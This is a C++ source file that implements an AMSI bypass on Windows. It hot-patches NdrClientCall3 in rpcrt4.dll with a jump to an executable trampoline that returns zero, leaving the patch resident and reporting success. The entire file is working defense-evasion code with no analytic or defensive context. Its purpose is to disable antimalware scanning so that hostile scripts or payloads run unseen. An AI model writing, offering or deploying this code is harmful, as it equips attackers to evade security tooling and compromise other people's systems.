#include "ghost_amsi.h"
#include <iostream>
#include <iostream>

#define PAGE_EXECUTE_READWRITE 0x40
#define MEM_COMMIT             0x1000
#define MEM_RESERVE             0x2000
#define PATCH_SIZE             12

BOOL PatchAmsiWithTrampoline()
{
    printf("[*] AMSI Bypass with CFG-safe Trampoline\n");
    printf("[*] ===================================\n");

    // ============================================
    // Step 1: Allocate trampoline page
    // ============================================
    printf("[*] Allocating trampoline page...\n");
    PBYTE trampoline = (PBYTE)VirtualAlloc(
        NULL,                   // lpAddress
        0x1000,                 // dwSize (1 page)
        MEM_COMMIT | MEM_RESERVE, // flAllocationType
        PAGE_EXECUTE_READWRITE   // flProtect
    );

    if (!trampoline) {
        printf("[-] VirtualAlloc failed: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Trampoline allocated at: 0x%p\n", trampoline);

    // ============================================
    // Step 2: Write hook code to trampoline
    // mov eax, 0; ret
    // x64: B8 00 00 00 00 C3
    // ============================================
    printf("[*] Writing hook code to trampoline...\n");
    BYTE hook[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };  // mov eax, 0; ret
    memcpy(trampoline, hook, sizeof(hook));
    printf("[+] Hook code written: B8 00 00 00 00 C3 (mov eax, 0; ret)\n");

    // ============================================
    // Step 3: Flush instruction cache
    // ============================================
    printf("[*] Flushing instruction cache...\n");
    FlushInstructionCache(GetCurrentProcess(), trampoline, sizeof(hook));
    printf("[+] Instruction cache flushed\n");

    // ============================================
    // Step 4: Load rpcrt4.dll and find NdrClientCall3
    // ============================================
    printf("[*] Loading rpcrt4.dll...\n");
    HMODULE hRpcrt4 = LoadLibraryA("rpcrt4.dll");
    if (!hRpcrt4) {
        printf("[-] Failed to load rpcrt4.dll: %d\n", GetLastError());
        VirtualFree(trampoline, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[+] rpcrt4.dll loaded at: 0x%p\n", hRpcrt4);

    printf("[*] Finding NdrClientCall3...\n");
    PBYTE pNdrClientCall3 = (PBYTE)GetProcAddress(hRpcrt4, "NdrClientCall3");
    if (!pNdrClientCall3) {
        printf("[-] NdrClientCall3 not found: %d\n", GetLastError());
        VirtualFree(trampoline, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[+] NdrClientCall3 found at: 0x%p\n", pNdrClientCall3);

    // ============================================
    // Step 5: Unprotect target memory
    // ============================================
    printf("[*] Unprotecting NdrClientCall3 memory...\n");
    DWORD oldProtect;
    if (!VirtualProtect(pNdrClientCall3, PATCH_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        VirtualFree(trampoline, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[+] Memory unprotected (PAGE_EXECUTE_READWRITE)\n");

    // ============================================
    // Step 6: Write patch to NdrClientCall3
    // mov rax, trampoline; jmp rax
    // x64: 48 B8 [8-byte-addr] FF E0
    // ============================================
    printf("[*] Writing patch to NdrClientCall3...\n");

    // Build patch: 48 B8 [addr] FF E0
    BYTE patch[12];
    patch[0] = 0x48;  // REX.W prefix
    patch[1] = 0xB8;  // mov rax, imm64
    // Copy 8-byte trampoline address
    memcpy(&patch[2], &trampoline, 8);
    patch[10] = 0xFF; // jmp rax
    patch[11] = 0xE0;

    // Read original bytes first
    printf("[*] Original bytes: ");
    for (int i = 0; i < 12; i++) {
        printf("%02X ", pNdrClientCall3[i]);
    }
    printf("\n");

    // Write patch
    memcpy(pNdrClientCall3, patch, 12);
    printf("[+] Patch written: 48 B8 [trampoline] FF E0 (mov rax, addr; jmp rax)\n");

    // Flush cache after patch
    FlushInstructionCache(GetCurrentProcess(), pNdrClientCall3, PATCH_SIZE);

    // ============================================
    // Step 7: Restore protection
    // ============================================
    VirtualProtect(pNdrClientCall3, PATCH_SIZE, oldProtect, &oldProtect);
    printf("[+] Protection restored\n");

    // ============================================
    // Step 8: Verify
    // ============================================
    printf("[*] Verification (patched bytes): ");
    for (int i = 0; i < 12; i++) {
        printf("%02X ", pNdrClientCall3[i]);
    }
    printf("\n");

    // DON'T free trampoline or library - keep the patch!
    // VirtualFree(trampoline, 0, MEM_RELEASE);
    // FreeLibrary(hRpcrt4);

    printf("\n[+] AMSI BYPASS SUCCESSFUL! (CFG-safe)\n");
    return TRUE;
}